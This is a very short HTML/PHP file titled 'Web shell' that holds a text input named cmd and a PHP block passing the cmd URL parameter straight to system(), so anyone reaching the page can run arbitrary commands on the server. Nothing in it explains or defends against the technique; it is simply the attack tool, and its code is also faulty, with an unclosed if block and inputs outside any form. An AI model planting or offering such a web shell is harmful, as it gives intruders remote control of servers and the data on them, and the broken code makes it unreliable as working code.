<html>
<head>
  <h1>Web shell</h1>
</head>
<body>
  <input type=text name="cmd">
  <input type="submit">

  <?php
  if(isset($_GET['cmd'])){
    system($_GET['cmd']);
  ?>
</body>
</html>
